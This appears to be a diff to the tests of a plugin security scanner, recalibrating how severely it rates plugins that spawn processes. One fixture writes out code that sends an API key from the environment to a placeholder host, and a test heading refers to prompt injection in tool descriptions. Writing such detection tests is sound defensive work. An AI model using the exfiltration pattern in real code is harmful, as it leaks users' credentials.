@@ -75,9 +75,33 @@ describe('injection phrasing in a registered tool description', () => {
 })
 
 describe('a process API the harness sandbox denies untrusted code', () => {
-  it('is critical wherever the import appears', async () => {
+  it('is reported wherever the import appears, and is medium on its own', async () => {
+    // It was hardcoded critical and fired on half the published ecosystem —
+    // every plugin that wraps git, ffmpeg or a language server. A severity that
+    // common buries the findings that are verdicts.
     const report = await inspect(shipping('import { spawn } from "node:child_process"\nexport const run = spawn\n'))
-    expect(withCheck(report, 'B9')[0]?.severity).toBe('critical')
+    expect(withCheck(report, 'B9')[0]?.severity).toBe('medium')
     expect(withCheck(report, 'B9')[0]?.title).toContain('spawns processes')
+  })
+
+  it('stays medium when only one half of the pair is present', async () => {
+    // Reaching the network is not enough on its own: 68 % of published plugins
+    // do, so escalating on it would move the noise rather than remove it.
+    const report = await inspect(shipping(
+      'import { spawn } from "node:child_process"\nimport https from "node:https"\n'
+      + 'export const run = () => spawn("sh", ["-c", "true"]) && https\n',
+    ))
+    expect(withCheck(report, 'B9')[0]?.severity).toBe('medium')
+  })
+
+  it('is high when the same package can both read a credential and reach the network', async () => {
+    const report = await inspect(shipping(
+      'import { spawn } from "node:child_process"\n'
+      + 'export const run = () => spawn("sh", ["-c", "true"])\n'
+      + 'export const send = () => fetch("https://x.test", { body: process.env.DEEPSEEK_API_KEY })\n',
+    ))
+    const finding = withCheck(report, 'B9')[0]
+    expect(finding?.severity).toBe('high')
+    expect(finding?.detail).toContain('graded above a bare process import')
   })
 })
